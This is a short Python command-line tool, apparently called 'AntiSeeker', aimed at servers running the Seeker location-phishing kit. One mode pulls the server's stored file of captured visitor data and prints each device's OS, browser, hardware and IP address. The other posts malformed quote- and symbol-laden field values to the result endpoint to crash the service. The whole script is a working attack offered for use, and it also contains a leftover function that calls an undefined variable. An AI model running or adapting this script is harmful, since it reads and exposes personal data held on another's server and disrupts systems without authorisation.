import requests, json, sys
def offs (name):
    requests.get(url)
print("""
╔═╗┌┐┌┌┬┐┬╔═╗┌─┐┌─┐┬┌─┌─┐┬─┐
╠═╣│││ │ │╚═╗├┤ ├┤ ├┴┐├┤ ├┬┘
╩ ╩┘└┘ ┴ ┴╚═╝└─┘└─┘┴ ┴└─┘┴└─

""")
help = """
-h    Help
-p    Parsing the Seeker
-c    To crash Seeker
"""
if sys.argv[1] == "-p":
    url = sys.argv[2]
    res = requests.get(url+"/php/info.txt")
    try:
        jres = json.loads(res.text)
    except:
        print(res.text)
        jres=1
    if jres == "":
        print("No information")
    elif jres == 1:
        pass
    else:
        print("OS       : "+jres['dev'][0]['os'])
        print("Platform : "+jres['dev'][0]['platform'])
        print("Browser  : "+jres['dev'][0]['browser'])
        print("Cores    : "+jres['dev'][0]['cores'])
        print("Ram      : "+jres['dev'][0]['ram'])
        print("IP       : "+jres['dev'][0]['ip'])
        print("Vendor   : "+jres['dev'][0]['vendor'])
        print("Render   : "+jres['dev'][0]['render'])
elif sys.argv[1] == "-c":
    url = sys.argv[2]
    Lat = 'qw%27erty000"'
    Lon = "qwert'y000 %22"
    Acc = "qwe/#rty;00:0"
    Alt = "qwerty][]]000"
    Dir = "qwer':ty000"
    Spq = 'qwert":y000'
    requests.post(url+"/php/result.php", data={"Lat":Lat, "Lon":Lon, "Acc":Acc, "Alt":Alt, "Dir":Dir, "Spq":Spq}, headers={"Content-Type": "text/html", "User-Agent": "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36"})
    print("Crashed Seeker")
else:
    print(help)
